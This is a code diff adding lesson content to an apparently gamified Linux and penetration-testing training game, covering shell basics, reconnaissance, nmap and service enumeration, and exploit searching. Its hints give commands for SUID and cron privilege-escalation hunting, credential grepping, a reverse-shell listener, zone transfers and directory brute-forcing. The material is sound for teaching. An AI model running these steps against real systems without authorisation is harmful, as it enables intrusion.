@@ -1051,6 +1051,553 @@ const CHAPTERS = [
 ];
 
 // ─────────────────────────────────────────────────────────
+// LESSONS — rich content layer over the proven stage matchers.
+// Goal-based framing, progressive hints, and an explicit
+// "what you learned" debrief, without altering reachability.
+// ─────────────────────────────────────────────────────────
+const LESSONS = {
+  // ───────────────────────── CHAPTER 1 ─────────────────────────
+  "1.1": {
+    nar:"Cold boot. No memory of how you got here — just a cursor, blinking. Someone was here before you: the prompt still says 'stranger'. Before you can do anything, you need to know what the machine thinks you are and where it has put you.",
+    goal:"Establish three facts: who the machine thinks you are, where in the filesystem you are standing, and what is immediately around you.",
+    labels:{ whoami:"Determine the identity you've been given", pwd:"Determine your current location in the filesystem", ls:"Survey what sits in this directory" },
+    hints:["Three separate facts, three small commands. Each answers exactly one question about your situation.","Identity, location, contents. In Linux these are some of the very first words you ever learn.","The commands are whoami, pwd, and ls."],
+    learned:"You just ran the orientation triad every operator runs on a fresh shell: whoami (which account you're acting as), pwd (your absolute position in the tree), and ls (what's here). On a real engagement these three are reflex — you never act until you know who you are and where you stand, because the same command is harmless as one user and catastrophic as another.",
+    msg:"stranger. /home/stranger. A near-empty room.\nThe machine answered you. That means it's listening — and so is whatever else is in here." },
+  "1.2": {
+    nar:"The room looked empty. It isn't. Linux hides anything whose name begins with a dot, and the previous occupant clearly knew that. There's a message waiting for you that an ordinary look would never reveal.",
+    goal:"Force every file in this directory into view — including the hidden ones — and read the message left behind for you.",
+    labels:{ lsla:"Reveal hidden files as well as normal ones", secret:"Read the hidden message left for you" },
+    hints:["A plain listing lies by omission. There's a flag that says 'show me everything, including the dotfiles'.","Combine 'show all' with the 'long' listing so you also see owners and permissions.","Try ls -la, then cat the dotfile it reveals (its name starts with a dot)."],
+    learned:"Hidden files aren't secure — they're just polite. A leading dot only hides a file from a default ls; -a exposes it instantly. This is why recon always uses ls -la: SSH keys, shell history, credentials and config secrets all live in dotfiles, and attackers and defenders alike check them first.",
+    msg:"The hidden file speaks. Someone called V was here before you — and left a trail on purpose.\n\"If you can read this, you're awake. Follow what I left. — V\"" },
+  "1.3": {
+    nar:"V scattered notes across this machine. To follow them you have to move — into directories, through files, and back home again without getting lost. The filesystem is a tree; learn to climb it.",
+    goal:"Move into another directory, read something inside it, then return to your home directory.",
+    labels:{ cdDir:"Step into a subdirectory", catAny:"Read a file's contents", cdHome:"Return to your home directory" },
+    hints:["Moving between directories, reading a file, and 'going home' are three distinct motions.","cd changes directory; cat prints a file; cd with no argument (or ~) takes you home.","cd Documents — cat a file in there — then cd ~ to return."],
+    learned:"You can now traverse the tree: cd to descend or move sideways, cat to read, and cd ~ to snap back home from anywhere. Absolute paths (/etc/...) start at root; relative paths start where you stand. Fluent movement is the difference between exploring a box confidently and stumbling in the dark.",
+    msg:"You can move now. The machine is no longer one locked room — it's a map.\nV's notes mention 'the rule book in /etc'. Remember that." },
+  "1.4": {
+    nar:"Reading whole files is crude. Real work means pulling exactly the line you need out of a haystack — the top of a file, the tail of a log, or every line matching a word. V's trail rewards people who can read surgically.",
+    goal:"Pull the first lines out of one file, the last lines out of another, and search a file for a specific name.",
+    labels:{ head:"Read only the beginning of a file", tail:"Read only the end of a file", grep1:"Search a file for a specific term" },
+    hints:["Beginning, end, and 'lines containing X' are three different reading tools.","head shows the top, tail shows the bottom, grep filters to matching lines.","head /etc/passwd — tail /var/log/syslog — grep stranger /etc/passwd"],
+    learned:"head and tail let you sip from huge files instead of drowning; tail in particular is how you watch logs. grep is the single most-used tool in security work — it finds the needle. Together they turn 'a million lines' into 'the three lines that matter', which is the entire game in log analysis and recon.",
+    msg:"You can read anything, precisely. /etc/passwd shows other accounts exist — you are not alone on this box.\nOne name stands out. Keep it in mind." },
+  "1.5": {
+    nar:"Reading is half of it. To leave a mark — stage a payload, drop a note, build a workspace — you must create, write and destroy. V left this stage as a sandbox: prove you can shape the world before you try to escape it.",
+    goal:"Create a directory, create a file, write text into it, and then delete a file.",
+    labels:{ mkdir:"Create a new directory", touch:"Create an empty file", echord:"Write text into a file", rmFile:"Delete a file" },
+    hints:["Four acts of creation and destruction: make a folder, make a file, fill it, remove it.","mkdir makes directories; touch makes empty files; echo with > writes; rm deletes.","mkdir workspace — touch notes.txt — echo 'test' > notes.txt — rm notes.txt"],
+    learned:"You can now write to the filesystem: mkdir, touch, echo > file (overwrite) and echo >> file (append), and rm to delete. The > redirect is the workhorse — it's how you drop scripts, payloads and notes onto a target. And rm is unforgiving: there is no recycle bin on a shell. Respect it.",
+    msg:"You can shape this world now. Small changes — but yours.\nThis is chapter one of fifteen. V got much, much further. Follow." },
+
+  // ───────────────────────── CHAPTER 2 ─────────────────────────
+  "2.1": {
+    nar:"V's note said the machine keeps its rules in /etc. Every account, every trusted host, every scheduled job is written down there in plain text. Read the rule book and you start to see how this box actually runs — and where it's soft.",
+    goal:"Read the three files that define who can log in, which hosts are trusted, and what runs automatically.",
+    labels:{ etcPasswd:"Find out which accounts exist on this machine", etcHosts:"Find out which hosts this machine trusts by name", etcCron:"Find out what runs automatically and as whom" },
+    hints:["Accounts, known hosts, scheduled jobs — three files in /etc hold each.","The files are passwd, hosts and crontab. Read each with cat.","cat /etc/passwd — cat /etc/hosts — cat /etc/crontab"],
+    learned:"/etc/passwd lists every account (and despite the name holds no passwords — those moved to /etc/shadow long ago). /etc/hosts is local name resolution. /etc/crontab schedules jobs, often as root — and a cron job running a script you can edit is one of the most common privilege-escalation paths in real life. Reading config is reconnaissance.",
+    msg:"The rule book is open. Several users — and a backup job runs as root every few minutes.\nIf you can ever write to what that job runs… you become root. File that away." },
+  "2.2": {
+    nar:"Every file here wears a 9-character permission string like rwxr-xr-x. It decides what you can touch and what touches you. Learn to read it on sight — your entire path to power runs through these characters.",
+    goal:"Read the permission strings in /etc, change a file's permissions yourself, and check what you're allowed to run as root.",
+    labels:{ lsPerm:"Display permissions for files in /etc", chmod:"Change the permissions on a file", sudoL:"List what you may run via sudo" },
+    hints:["First inspect permissions, then modify a set, then ask the system what sudo grants you.","ls -l shows the rwx string; chmod with an octal like 755 sets it; sudo -l lists your rights.","ls -la /etc — chmod 755 notes.txt — sudo -l"],
+    learned:"The permission string is owner/group/other, each rwx, encoded as octal (r=4 w=2 x=1, so rwx=7, r-x=5). chmod sets it. sudo -l is gold on a target: it tells you exactly which commands you can run as root, and a single misconfigured entry (an editor, an interpreter) is often the whole privilege escalation. You read the lock and you found the spare key's hiding place.",
+    msg:"sudo -l reveals editors and interpreters runnable as root, no password.\nYou don't need them yet. But when you want root, you now know one way in." },
+  "2.3": {
+    nar:"One command's output becomes another's input — that's the pipe, and it's how real operators do in a single line what scripts take pages to do. V's logs are full of one-liners. Learn the plumbing.",
+    goal:"Chain two commands with a pipe, redirect a command's output into a file, and append more to that file.",
+    labels:{ pipe1:"Feed one command's output into another", redir:"Send a command's output into a file", append1:"Add to a file without overwriting it" },
+    hints:["Connecting commands, writing output to a file, and adding to a file are three different operators.","| pipes between commands; > writes (overwriting); >> appends.","ps aux | grep root — ls -la > filelist.txt — echo 'more' >> filelist.txt"],
+    learned:"The pipe | streams stdout into the next command's stdin; > and >> redirect to files (overwrite vs append). This is the soul of the shell: cat log | grep Failed | cut -d' ' -f1 | sort | uniq -c | sort -rn turns a raw auth log into a ranked list of attacking IPs in one breath. Master pipelines and you stop writing scripts for things that are really one line.",
+    msg:"Pipelines. The machine bends to a single line now.\nV used these constantly — the logs you'll read later are full of their one-liners." },
+  "2.4": {
+    nar:"This filesystem is huge and the interesting things are buried. find and grep are your flashlights: find locates files by name or property, grep finds text inside them. The most dangerous thing you can find is a misconfigured SUID binary.",
+    goal:"Find files by name pattern, hunt for files with the SUID bit set, and recursively search for the word 'password' under /etc.",
+    labels:{ findName:"Locate files by name across the system", findSuid:"Hunt for SUID-marked binaries", grepR:"Search recursively for a keyword inside /etc" },
+    hints:["Find by name, find by special permission bit, and search inside many files — three searches.","find / -name '<pattern>' locates names; find / -perm finds permission bits; grep -r searches text.","find / -name '*.conf' 2>/dev/null — find / -perm -u=s -type f 2>/dev/null — grep -r 'password' /etc 2>/dev/null"],
+    learned:"find with -name searches by filename; with -perm -u=s it surfaces SUID binaries — programs that run as their owner (often root) no matter who launches them, which is a top privilege-escalation hunting ground. grep -r drags a keyword through entire trees. The 2>/dev/null hides the permission-denied noise so the signal stands out. This is how you find creds and weak files fast.",
+    msg:"Your flashlights work. SUID binaries exist on this box, and 'password' appears in more config files than it should.\nSloppy admins leave creds in plaintext. Remember where." },
+  "2.5": {
+    nar:"Raw text is rarely the answer — you need the third column, the unique values, the count. awk, cut, sort and wc carve structured data out of unstructured output. This is the difference between staring at a file and interrogating it.",
+    goal:"Extract a single column two different ways, sort some output, and count lines.",
+    labels:{ awk1:"Extract one field from each line with awk", cut1:"Extract one field from each line with cut", sort1:"Order some output", wc1:"Count the lines in a file" },
+    hints:["Pull a column (twice, two tools), put output in order, and count lines.","awk -F: '{print $1}' and cut -d: -f1 both grab the first colon-field; sort orders; wc -l counts.","awk -F: '{print $1}' /etc/passwd — cut -d: -f1 /etc/passwd — sort it — wc -l /etc/passwd"],
+    learned:"awk is a whole language for field-by-field processing; cut is the quick blade for delimiter-split columns; sort orders (and sort -n sorts numerically); wc -l counts. These four plus grep are the text-processing core of every log triage and recon pipeline you'll ever build. You can now reshape any column of data into exactly the view you need.",
+    msg:"You can dissect text now, not just read it.\nThe skills are stacking. V's trail leads deeper — into the machine's mind next." },
+  "2.6": {
+    nar:"When one line isn't enough, you script. Loops repeat work; conditionals make decisions. A ping sweep, a subdomain brute-force, a credential spray — all of them are just a loop with a body. Learn the shape.",
+    goal:"Write a loop that repeats an action, and an if-statement that makes a decision.",
+    labels:{ forLoop:"Write a loop that repeats a command", ifCond:"Write a conditional that tests something" },
+    hints:["One construct repeats; one decides. Both end with done or fi.","for VAR in LIST; do ...; done loops. if [ TEST ]; then ...; fi decides.","for i in 1 2 3; do echo $i; done — if [ -f /etc/passwd ]; then echo yes; fi"],
+    learned:"for loops iterate over lists (hosts, ports, words); if/[ ] tests conditions (file exists, value matches). Bash scripting is just these two ideas plus the commands you already know — which is exactly how ping sweeps, port knocks and password sprays are built. You now have the control flow to automate anything you can do by hand.",
+    msg:"Loops and logic. You can automate now.\nEverything from here — scanning, brute-forcing, sweeping — is a loop wrapped around a tool." },
+
+  // ───────────────────────── CHAPTER 3 ─────────────────────────
+  "3.1": {
+    nar:"A running system is a crowd of processes, each with an ID, an owner, and a command line that betrays exactly what it's doing. The machine's very first process — PID 1 — is its origin. Something here is also watching you.",
+    goal:"List the running processes, watch them live, and inspect what command started PID 1.",
+    labels:{ psaux:"List every running process", topCmd:"Watch processes update in real time", procDir:"Inspect the command line of process 1" },
+    hints:["A snapshot of processes, a live view, and the origin process — three ways to see what's running.","ps aux is the snapshot; top is the live view; /proc/1/cmdline is PID 1's command line.","ps aux — top — cat /proc/1/cmdline"],
+    learned:"ps aux is the full process snapshot (USER, PID, command); top is the live, sorted view; and /proc is the kernel's window into everything — /proc/PID/cmdline reveals exactly how any process was launched. Reading processes tells you what services to attack, what's monitoring you, and — when you're root — what to kill. The /proc filesystem is a forensic goldmine.",
+    msg:"PID 1 is init — the machine's first breath. But process 1847 caught your eye: an 'axiom-daemon' with --watch-session.\nSomething is monitoring this shell. V warned about a warden." },
+  "3.2": {
+    nar:"Identity on Linux is numbers: UIDs and GIDs, group memberships, login records. Who are you really, who else has been here, and when? The login history is a confession the machine can't help making.",
+    goal:"Confirm your numeric identity and groups, see who is logged in, and read the login history.",
+    labels:{ idCmd:"Show your user and group IDs", whoCmd:"Show who is currently logged in", lastCmd:"Show the record of past logins" },
+    hints:["Your IDs, the current sessions, and the historical logins — three views of identity.","id shows UID/GID/groups; who shows current sessions; last shows login history.","id — who — last"],
+    learned:"id reveals your UID/GID and — crucially — supplementary groups like sudo or docker, which can be privilege-escalation routes by themselves. who shows live sessions; last reads the login record. Group membership is a quietly powerful thing: being in 'docker' or 'lxd' is often equivalent to being root. You just learned to read identity the way the kernel sees it.",
+    msg:"You're UID 1000, but you're in the sudo group. That matters.\nThe login history shows V's sessions — and an abrupt last entry. They stopped logging in one day and never came back." },
+  "3.3": {
+    nar:"Services listen; sockets are the doors they open. Every open port is an attack surface — and the fastest way to understand a box is to ask what it's listening for and what it's already talking to.",
+    goal:"List the running services, show listening sockets, and show active connections.",
+    labels:{ sctl:"List the system's services", ssCmd:"Show listening TCP/UDP sockets", netstatC:"Show active network connections" },
+    hints:["Services, listening ports, and live connections — three layers of 'what's talking'.","systemctl list-units --type=service lists services; ss -tuln shows listeners; netstat -an shows connections.","systemctl list-units --type=service — ss -tuln — netstat -an"],
+    learned:"systemctl manages services; ss -tuln lists listening sockets (t=tcp, u=udp, l=listening, n=numeric); netstat -an shows all connections. Open listening ports are literally your map of what to attack — every service version behind a port is a potential CVE. Reading sockets is how you turn 'a host' into 'a list of doors to try'.",
+    msg:"Local services are listening — including one bound only to localhost that the outside world can't reach.\nV's notes hint that the escape route runs through a service like that. Noted." },
+  "3.4": {
+    nar:"The environment is the shell's invisible context — variables that decide where it looks for programs, who it thinks you are, and sometimes, carelessly, what secrets it carries. PATH especially is a weapon in the right hands.",
+    goal:"Print the environment, and read your shell's startup config.",
+    labels:{ envCmd:"Print all environment variables", bashrcC:"Read your shell's startup configuration" },
+    hints:["The live environment, and the file that builds it at login — two things to read.","env dumps variables; ~/.bashrc is the startup script. Look closely at what's set.","env — cat ~/.bashrc"],
+    learned:"env shows variables like PATH (the search order for commands), HOME and USER; ~/.bashrc configures each shell. PATH matters in attacks: if a root cron job calls a command by name and you control an earlier PATH entry, you can hijack it. Secrets also leak into env constantly (API keys, DB passwords). Reading the environment is reading the machine's assumptions.",
+    msg:"There's a custom variable in your environment that shouldn't be there — AXIOM_KEY, set to something that looks like a fragment.\nV left pieces of a key scattered as environment values, file contents, encoded strings. Collect them." },
+  "3.5": {
+    nar:"When the shell isn't enough, Python is always there. A single python3 -c line can open sockets, run commands, or upgrade a broken shell into a real one. It's the operator's universal tool when nothing else fits.",
+    goal:"Run a one-line Python program, use Python to read the hostname, and use Python to execute a system command.",
+    labels:{ pyHello:"Run a one-line Python program", pySocket:"Use Python to read the machine's hostname", pyOs:"Use Python to run a system command" },
+    hints:["Print something, read the hostname via a module, and shell out to the OS — three Python one-liners.","python3 -c \"...\" runs inline; import socket gets the hostname; import os runs commands.","python3 -c \"print('alive')\" — python3 -c \"import socket; print(socket.gethostname())\" — python3 -c \"import os; print(os.popen('id').read())\""],
+    learned:"python3 -c runs code without a script file — invaluable when you land a limited shell. import os and os.popen() (or subprocess) run system commands; the classic pty.spawn('/bin/bash') one-liner upgrades a dumb reverse shell into a fully interactive one. Python is the operator's swiss-army knife precisely because it's preinstalled almost everywhere.",
+    msg:"Python answers. You can script the machine in a language now, not just the shell.\nV used Python to stabilise their shells. You'll need that trick in the exploitation chapters." },
+
+  // ───────────────────────── CHAPTER 4 ─────────────────────────
+  "4.1": {
+    nar:"You've mapped the inside. Now look outward. Before you can attack a network you must know your own position in it — your address, your routes, who your neighbours are. Orientation comes before aggression.",
+    goal:"Find your own IP address, your routing table, and the neighbours your machine already knows about.",
+    labels:{ ipAddr:"Find your own network address", ipRoute:"Find how traffic leaves this machine", arpA:"List the neighbours on your local segment" },
+    hints:["Your address, your routes out, and your local neighbours — three views of your position.","ip addr shows interfaces; ip route shows the gateway; arp -a lists known neighbours.","ip addr — ip route — arp -a"],
+    learned:"ip addr shows your interfaces and IPs; ip route shows your default gateway (the door to other networks); arp -a lists machines your host has already spoken to on the local segment — instant targets. Knowing your subnet and gateway tells you what you can reach and where to pivot. You can't attack a network you haven't located yourself within.",
+    msg:"You're on 10.0.0.0/24, gateway .1, and a host .10 is already in your ARP table.\nThat .10 is the target V was working. It's where the trail leads." },
+  "4.2": {
+    nar:"Everything on the wire rides on TCP/IP. Understand the three-way handshake and you understand why scans work, why firewalls behave as they do, and how to talk to a port by hand with nothing but netcat.",
+    goal:"Read the notes on how TCP connections form, and open a raw listener you could catch a connection on.",
+    labels:{ tcpNotes:"Study how a TCP connection is established", ncListen:"Open a raw TCP listener" },
+    hints:["First understand the handshake from the notes, then open a port to listen on yourself.","There's a tcp_notes file to read; nc -lvnp PORT opens a listener.","cat tcp_notes.txt — nc -lvnp 4444"],
+    learned:"TCP connects with a three-way handshake: SYN, SYN-ACK, ACK. Scanners exploit it (a half-open SYN scan never completes the handshake, which is stealthier); firewalls filter on it. netcat (nc -lvnp) opens a raw listener — the catcher for reverse shells and the swiss-army knife of the network. Understanding the handshake is understanding the foundation everything else stands on.",
+    msg:"The handshake makes sense now. You opened a listener — the same kind of port that catches a reverse shell.\nThat's exactly how V planned to receive the escape signal." },
+  "4.3": {
+    nar:"DNS is the internet's phone book — and a chronically leaky one. Query the right records and a misconfigured server will hand you its entire internal map through a zone transfer. Names are intelligence.",
+    goal:"Look up an address record, look up a mail record, and attempt a full zone transfer.",
+    labels:{ digA:"Resolve a domain's address record", digMX:"Resolve a domain's mail records", digAXFR:"Attempt a full DNS zone transfer" },
+    hints:["A normal lookup, a mail-server lookup, and the big one — asking a server for its whole zone.","dig DOMAIN A and dig DOMAIN MX do lookups; dig axfr @nameserver domain attempts a transfer.","dig google.com A — dig google.com MX — dig axfr @ns1.target.machine target.machine"],
+    learned:"dig queries DNS records: A (address), MX (mail), and many more. A zone transfer (AXFR) is meant only for backup name servers — but a misconfigured server will dump every record to anyone who asks, handing you every subdomain (admin, vpn, dev, internal) in one shot. DNS enumeration is often the richest, quietest recon you'll do.",
+    msg:"The zone transfer succeeded. admin, dev, vpn, backup, internal — the whole internal map, from one misconfigured server.\nV's notes circled 'internal'. That's where the real machine lives." },
+  "4.4": {
+    nar:"The web speaks HTTP, and curl speaks it fluently and without a browser's politeness. Headers reveal the server's software; robots.txt cheerfully lists the very paths the admin wanted hidden. Ask the server directly.",
+    goal:"Fetch a page, read just its headers, and check robots.txt for paths the admin tried to hide.",
+    labels:{ curlGet:"Fetch a web page's body", curlHead:"Fetch only a page's HTTP headers", curlRobo:"Check robots.txt for hidden paths" },
+    hints:["The page itself, just the headers, and the file that lists 'please don't look here' — three requests.","curl URL fetches; curl -I URL gets headers only; request /robots.txt for disallowed paths.","curl http://10.0.0.10/ — curl -I http://10.0.0.10/ — curl http://10.0.0.10/robots.txt"],
+    learned:"curl is HTTP without a browser — scriptable, header-readable, perfect for recon. curl -I shows response headers (Server:, X-Powered-By: — instant tech fingerprinting). robots.txt is meant to steer search engines but in practice it's a signposted list of the admin/backup/private paths someone wanted hidden — one of the first files every web attacker reads.",
+    msg:"robots.txt disallows /admin and /backup — which is to say, it points straight at them.\nV's web notes start there. The application on .10 is the way in." },
+  "4.5": {
+    nar:"Sometimes you need to see the raw packets — to confirm a connection, pull a plaintext credential off the wire, or save traffic for later. tcpdump is the wiretap. Capture, save, replay.",
+    goal:"Capture live traffic, save a capture to a file, and read that capture back.",
+    labels:{ tcpBasic:"Capture live network traffic", tcpWrite:"Save a capture to a file", tcpRead:"Read a saved capture back" },
+    hints:["Watch packets live, write them to a file, then read the file — three tcpdump modes.","tcpdump -i IFACE -n captures; -w FILE saves; -r FILE reads back.","tcpdump -i eth0 -n — tcpdump -i eth0 -w capture.pcap — tcpdump -r capture.pcap"],
+    learned:"tcpdump captures packets off an interface (-i), resolves nothing with -n for speed, writes pcap with -w and replays with -r. On an unencrypted protocol, a capture hands you credentials in cleartext; even on encrypted traffic, metadata (who talks to whom, when) is intelligence. This is the same engine Wireshark wraps in a GUI — the wiretap underneath all packet analysis.",
+    msg:"You can read the wire now. A saved capture is evidence — and sometimes a password in plaintext.\nV captured something on .10 and hid the pcap. You'll find it." },
+
+  // ───────────────────────── CHAPTER 5 ─────────────────────────
+  "5.1": {
+    nar:"Real attacks start silent. Before you touch the target you learn everything the world already knows about it — registration data, certificates, indexed pages. Passive recon leaves no footprint and often hands you the keys.",
+    goal:"Pull registration data, read the target's TLS certificate, and review the dorking notes for indexed exposures.",
+    labels:{ whois:"Look up domain registration data", openssl:"Inspect the target's TLS certificate", googDork:"Study search-engine dorking techniques" },
+    hints:["Registration info, the certificate, and search-engine tricks — three passive sources.","whois DOMAIN for registration; openssl s_client -connect HOST:443 for the cert; read the dorking notes.","whois target.machine — openssl s_client -connect 10.0.0.10:443 — cat google_dorking.txt"],
+    learned:"Passive recon never touches the target directly: whois reveals registrant and infrastructure detail; a TLS certificate leaks hostnames and internal names in its SAN field; Google dorks (site:, filetype:, inurl:) surface documents and panels the target accidentally indexed. The quietest recon is often the most productive — and it's invisible to the defender.",
+    msg:"The certificate's SAN field lists internal hostnames the admin never meant to expose.\nV built their whole map from passive sources first. Loud comes later." },
+  "5.2": {
+    nar:"DNS deserves its own pass. Beyond a single zone transfer, you enumerate every subdomain you can — by transfer, by brute force, by automation. Each name is another foothold the defender forgot about.",
+    goal:"Run automated DNS enumeration, and brute-force subdomains with a loop of your own.",
+    labels:{ dnsrecon:"Run automated DNS enumeration", subBrute:"Brute-force subdomains using a loop" },
+    hints:["One automated tool, and one loop you write yourself to guess names.","dnsrecon -d DOMAIN automates it; a for loop over candidate names with dig brute-forces.","dnsrecon -d target.machine — for sub in admin mail vpn; do dig $sub.target.machine; done"],
+    learned:"dnsrecon automates record-pulling and transfers; but the loop you wrote is the real lesson — subdomain brute-forcing is just iterating candidate names and asking DNS if they resolve. Forgotten subdomains (dev, staging, old-vpn) are perennial soft targets because nobody patches what nobody remembers. You turned the control flow from Chapter 2 into a recon weapon.",
+    msg:"A staging subdomain answered that the admins forgot existed. Forgotten things are unguarded things.\nV's notes: 'the way in was never the front door.'" },
+  "5.3": {
+    nar:"People are the softest target. OSINT harvests emails, names, and the metadata hiding inside published documents and photos — the username baked into a PDF, the GPS in a JPEG. The org tells you its own secrets if you read carefully.",
+    goal:"Harvest emails and names for the target, pull metadata out of a published photo, and review the methodology notes.",
+    labels:{ harvest:"Harvest emails and names for the target", exiftool1:"Extract hidden metadata from a file", method:"Review the recon methodology notes" },
+    hints:["Gather people-data, strip metadata from a file, and read the method notes — three OSINT moves.","theHarvester gathers emails/names; exiftool reads embedded metadata; read methodology.txt.","theHarvester -d target.machine -b google — exiftool employee_photo.jpg — cat methodology.txt"],
+    learned:"OSINT mines public data: theHarvester scrapes emails and hostnames; exiftool reads metadata embedded in files — author usernames in documents, software versions, even GPS coordinates in photos. Harvested email formats become login guesses; leaked usernames seed password sprays. The target publishes its own attack surface, and almost no one scrubs metadata before posting.",
+    msg:"The photo's metadata leaked the photographer's username — and it matches an account format on the box.\nV built a username list this exact way. Names become logins become access." },
+  "5.4": {
+    nar:"Now you make noise — carefully. Active recon touches the network: who's alive, what ports answer, what a service announces about itself when you knock. The art is learning the most while triggering the least.",
+    goal:"Sweep the local network for live hosts your own way, scan a host's neighbours, and grab a service banner.",
+    labels:{ arpScan:"Discover live hosts on the local network", pingSweep:"Sweep for live hosts using a loop", banner:"Grab a service's identifying banner" },
+    hints:["A layer-2 host discovery, a ping sweep you script, and a banner grab — three active probes.","arp-scan --localnet finds hosts; a for loop of pings sweeps; nc -v HOST PORT grabs a banner.","arp-scan --localnet — for i in $(seq 1 20); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo $i; done — nc -v 10.0.0.10 22"],
+    learned:"Active recon probes directly: arp-scan finds hosts at layer 2 (impossible to firewall on a LAN); a ping sweep loop finds live IPs; banner grabbing with netcat makes a service announce its software and version — which you feed straight into vulnerability research. The skill is calibration: enough probing to map the target, little enough to stay under the alert threshold.",
+    msg:"Port 22 on .10 announced its SSH version on contact. A version is a CVE waiting to be looked up.\nV's banner notes are meticulous. Loud, but precise." },
+  "5.5": {
+    nar:"Findings you don't record are findings you'll lose. Every serious operator keeps a structured workspace from minute one — it's how a chaotic engagement becomes a report, and how you ever find that one note again at 3am.",
+    goal:"Build a workspace directory and start a target notes file inside it.",
+    labels:{ workspace:"Create and enter a dedicated workspace", targetFile:"Start a structured target notes file" },
+    hints:["Make a place to work, move into it, and start writing findings down.","mkdir a workspace and cd into it; echo your first finding into a notes file.","mkdir workspace && cd workspace — echo '[target]' > notes.txt"],
+    learned:"Documentation discipline separates professionals from script-runners: a per-target workspace, a notes file capturing every host/port/cred/finding with timestamps, screenshots of proof. It's not bureaucracy — it's how you avoid re-scanning, how you write the report, and (on real engagements) how you prove what you did and when if anyone ever asks. Recon ends where organisation begins.",
+    msg:"Your workspace is open and your first findings are written down.\nV's own workspace is somewhere on this box — find it and you inherit their entire investigation." },
+
+  // ───────────────────────── CHAPTER 6 ─────────────────────────
+  "6.1": {
+    nar:"Recon gave you the shape. Nmap fills in every detail — which ports are open, what service and version sits behind each, what the OS is. It is the single most important reconnaissance tool you will ever use. Learn its core scans cold.",
+    goal:"Run a basic scan, then add version detection, then default scripts, then an aggressive all-in-one scan.",
+    labels:{ nmapBasic:"Run a basic port scan", nmapSV:"Detect service versions", nmapSC:"Run nmap's default safe scripts", nmapA:"Run an aggressive combined scan" },
+    hints:["A plain scan, then version detection, then scripts, then everything at once — escalating depth.","nmap HOST is basic; -sV adds versions; -sC adds default scripts; -A combines them.","nmap 10.0.0.10 — nmap -sV 10.0.0.10 — nmap -sC 10.0.0.10 — nmap -A 10.0.0.10"],
+    learned:"Nmap maps a target: a bare scan finds open ports; -sV fingerprints exact service versions (the link to known CVEs); -sC runs safe default NSE scripts that pull extra detail; -A bundles version, scripts, OS detection and traceroute. Version numbers are the bridge from 'a port is open' to 'this exact software has this exact exploit'. Every engagement starts here.",
+    msg:"The scan is back: open ports, exact versions, one of them old enough to have a public exploit.\nV's scan results match yours almost exactly. You're walking their footsteps now." },
+  "6.2": {
+    nar:"Nmap is a scanning engine with hundreds of scripts bolted on — the NSE. The right script checks for known vulns, enumerates a web app, or maps SMB shares automatically. It's recon and vuln-scanning fused into one.",
+    goal:"Run the vulnerability scripts, enumerate the web server, and enumerate SMB shares.",
+    labels:{ nmapVuln:"Scan for known vulnerabilities", nmapHttp:"Enumerate the web server with scripts", nmapSmb:"Enumerate SMB shares with scripts" },
+    hints:["A vuln check, a web enumeration, and an SMB share enumeration — three NSE categories.","--script=vuln checks vulns; --script=http-enum enumerates web; --script=smb-enum-shares maps shares.","nmap --script=vuln 10.0.0.10 — nmap --script=http-enum 10.0.0.10 -p80 — nmap --script=smb-enum-shares 10.0.0.10"],
+    learned:"The Nmap Scripting Engine (NSE) automates deep checks: the vuln category flags known CVEs; http-enum finds web paths; smb-enum-shares lists network shares (a classic source of exposed files and creds). One scan can replace a dozen manual tools. The trade-off is noise — scripts are loud — so you choose categories deliberately rather than firing everything.",
+    msg:"The vuln scripts flagged a known CVE on an exposed service, and SMB is sharing a folder it shouldn't.\nV's notes name that same share. The trail tightens." },
+  "6.3": {
+    nar:"Open ports are invitations. Service enumeration accepts them — FTP that allows anonymous login, SNMP answering to 'public', SMB spilling users and shares. The detail you pull here is what makes the exploit later trivial.",
+    goal:"Enumerate FTP for anonymous access, walk SNMP with the default community string, and fully enumerate SMB.",
+    labels:{ ftpEnum:"Test FTP for anonymous access", snmpEnum:"Walk SNMP with the default community", enum4l:"Fully enumerate the SMB service" },
+    hints:["FTP anonymous login, SNMP with the default string, and a full SMB enum — three services.","ftp HOST then try 'anonymous'; snmpwalk -v1 -c public HOST; enum4linux -a HOST.","ftp 10.0.0.10 — snmpwalk -v1 -c public 10.0.0.10 — enum4linux -a 10.0.0.10"],
+    learned:"Each service leaks differently: anonymous FTP hands out files to anyone; SNMP with the default 'public' community string dumps system inventory, running processes, even ARP tables; enum4linux extracts users, shares and password policy from SMB. Default credentials and community strings are everywhere because someone never changed them. Enumeration is patient, unglamorous, and where engagements are actually won.",
+    msg:"Anonymous FTP let you in, and SMB enumeration listed every user account on the box.\nA full username list. Exactly what V assembled before they went quiet." },
+  "6.4": {
+    nar:"Web servers hide most of their surface behind unlinked paths. Directory brute-forcing knocks on thousands of likely doors; vulnerability scanners and fingerprinters tell you what the application is built from. You map what the browser never shows.",
+    goal:"Brute-force hidden directories, run a web vulnerability scan, and fingerprint the web stack.",
+    labels:{ gobust:"Brute-force hidden web directories", nikto:"Scan the web server for known issues", whatweb:"Fingerprint the web technology stack" },
+    hints:["Discover hidden paths, scan for known web flaws, and fingerprint the stack — three web tools.","gobuster dir busts directories; nikto scans for issues; whatweb fingerprints tech.","gobuster dir -u http://10.0.0.10/ -w /usr/share/wordlists/dirb/common.txt — nikto -h http://10.0.0.10/ — whatweb http://10.0.0.10/"],
+    learned:"gobuster (or dirb/ffuf) brute-forces paths against a wordlist, finding /admin, /backup, /api that no link points to; nikto flags known misconfigurations and dangerous files; whatweb fingerprints the CMS, framework and server. Web attacks live or die on enumeration — the vulnerable endpoint is almost always one nobody linked to and the scanner found.",
+    msg:"The directory bust found an admin panel and a forgotten backup file. The fingerprint named the framework — and its version has a public exploit.\nV's path went straight through that panel." },
+  "6.5": {
+    nar:"You have versions; now find the matching exploit. searchsploit is an offline database of public exploits — search by software and version, copy the code, and you're holding the key that fits the lock you found.",
+    goal:"Search the exploit database for the target's software, and copy a matching exploit out to work on.",
+    labels:{ srchspl:"Search the exploit database by software", srchCopy:"Copy a matching exploit locally" },
+    hints:["Search for an exploit matching the version, then pull a copy to your workspace.","searchsploit SOFTWARE VERSION searches; searchsploit -m ID copies it out.","searchsploit Apache 2.4 — searchsploit -m 50383"],
+    learned:"searchsploit is a local mirror of Exploit-DB — search by product and version offline, then -m to copy an exploit into your working directory to read and adapt. The workflow is the whole point: enumerate exact versions, search for matching public exploits, verify and adapt before firing. Most 'hacking' is disciplined matching of a known flaw to a confirmed version.",
+    msg:"You found a public exploit matching the exact version on .10 and copied it to your workspace.\nV did the same — their copy is still here, annotated. You're about to use their work." },
